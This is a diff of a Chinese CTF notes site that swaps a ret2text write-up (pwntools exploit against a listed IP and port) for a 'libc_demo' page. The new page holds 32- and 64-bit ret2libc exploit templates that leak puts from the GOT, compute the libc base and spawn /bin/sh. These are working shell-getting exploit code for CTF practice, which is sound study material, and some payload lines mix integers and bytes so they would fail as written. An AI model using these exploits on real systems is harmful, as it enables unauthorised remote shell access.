@@ -14,7 +14,7 @@
     
     
       
-        <title>Pwn_CTFShow_02 - Trick</title>
+        <title>libc_demo - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#101ret2text" class="md-skip">
+        <a href="#32bit" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              Pwn_CTFShow_02
+              libc_demo
             
           </span>
         </div>
@@ -175,10 +175,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
     
     <label class="md-nav__link" for="nav-2">
       Pwn
@@ -232,11 +234,52 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../libc_demo/" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        libc_demo
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+    
+    <a href="./" class="md-nav__link md-nav__link--active">
       libc_demo
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#32bit" class="md-nav__link">
+    32bit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#64bit" class="md-nav__link">
+    64bit
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -261,12 +304,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       writeUp
@@ -308,45 +349,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        Pwn_CTFShow_02
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../Pwn_CTFShow_02/" class="md-nav__link">
       Pwn_CTFShow_02
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -437,8 +444,15 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#101ret2text" class="md-nav__link">
-    1.01栈溢出之ret2text
+  <a href="#32bit" class="md-nav__link">
+    32bit
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#64bit" class="md-nav__link">
+    64bit
   </a>
   
 </li>
@@ -456,32 +470,91 @@
               
                 
                 
-                  <h1>Pwn_CTFShow_02</h1>
+                  <h1>libc_demo</h1>
                 
-                <h2 id="101ret2text">1.01栈溢出之ret2text</h2>
-<p>很简单的一个栈溢出
-直接IDA分析</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194826370.png#pic_center" /></p>
-<p>从main函数跟进到welcome函数
-get() 很明显的溢出</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012194915979.png#pic_center" /></p>
-<pre><code class="language-python">payload = 'a'*(0x80+8)
-</code></pre>
-<p>因为是64位的，所以后面要加上8
-Shift+F12 </p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195035341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>发现/bin/sh 果然够简单的。。。
-双击进去</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195145849.png#pic_center" /></p>
-<p>再双击</p>
-<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201012195243513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
-<p>找到地址
-exp：</p>
+                <h2 id="32bit">32bit</h2>
 <pre><code class="language-python">from pwn import *
 
-p=remote('111.231.70.44',28072)
+context.log_level = 'debug'
 
-payload='a'*(0x80+8) + p64(0x40063B)
+elf = ELF('./pwn')  #产生一个对象
+
+p = remote('xxx.xxx.xxx.xxx',xxxx)
+
+puts_plt = elf.plt['puts']
+
+puts_got = elf.got['puts']
+
+main_addr = elf.symbols['main'] #elf.symbols['a_function']  找到 a_function 的地址
+
+payload = b&quot;A&quot;*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
+#libc32位: b&quot;a&quot;*offset + p32(plt) + p32(ret_addr) + p32(got)
+
+p.sendline(payload)
+
+p.recvuntil('some_string') #p.recvuntil(some_string) 接收到 some_string 为止
+
+get_addr = u32(p.recv(4))   #p.recvn(N)   接受 N(数字) 字符
+
+print(hex(get_addr))
+
+libcbase = get_addr - 0x067360      # -libc_Offset的puts
+
+system_addr = libcbase + 0x03cd10   # +libc_Offset的system
+
+bin_sh = libcbase + 0x17b8cf        # +libc_Offset的bin/sh
+
+payload = b'a'*13 + system_addr + b'aaaa' + bin_sh
+#payload = flat([b'A'*13,system_addr,b'AAAA',bin_sh])
+#getshell: b&quot;a&quot;*offset + p32(system_addr) + b&quot;AAAA&quot; + p32(str_bin_sh)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h2 id="64bit">64bit</h2>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = 'debug'
+
+context.arch = 'amd64'
+
+#p = process('./pwn')
+
+p = remote('xxx.xxx.xxx.xxx',xxxx)
+
+elf = ELF('./pwn')  #产生一个对象
+
+puts_plt = elf.plt['puts']
+
+puts_got = elf.got['puts']
+
+pop_rdi = 0x4006e3 # ROPgadget --binary [file name]
+
+main = elf.symbols['main']  #elf.symbols['a_function']  找到 a_function 的地址
+
+payload = b'a'*20 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
+#64位payload: &quot;a&quot;*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)
+
+p.sendline(payload)
+
+p.recvuntil('some_string') #p.recvuntil(some_string) 接收到 some_string 为止
+
+puts_addr = u64(p.recv(6).ljust(8,b'\x00')) #p.recvn(N)   接受 N(数字) 字符
+
+print(hex(puts_addr))
+
+ret_addr = 0x4006E4
+
+libcbase = puts_addr -  0x0809c0    # -libc_Offset的puts
+
+system_addr = libcbase + 0x04f440   # +libc_Offset的system
+
+bin_sh = libcbase + 0x1b3e9a        # +libc_Offset的bin/sh
+
+payload = b'a'*20 + ret_addr + pop_rdi + bin_sh + system_addr
+#payload = flat([b'a'*20,ret_addr,pop_rdi,bin_sh,system_addr])
+#getshell: b&quot;a&quot;*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
 
 p.sendline(payload)
 
@@ -505,7 +578,7 @@ p.interactive()
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href="../Pwn_CTFShow_01/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../Pwn%28ubuntu_docker%29/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -514,19 +587,19 @@ p.interactive()
                 <span class="md-footer-nav__direction">
                   上一页
                 </span>
-                Pwn_CTFShow_01
+                Pwn出题
               </div>
             </div>
           </a>
         
         
-          <a href="../Pwn_0xGame_01/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../test/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   下一页
                 </span>
-                Pwn_0xGame_01
+                test
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
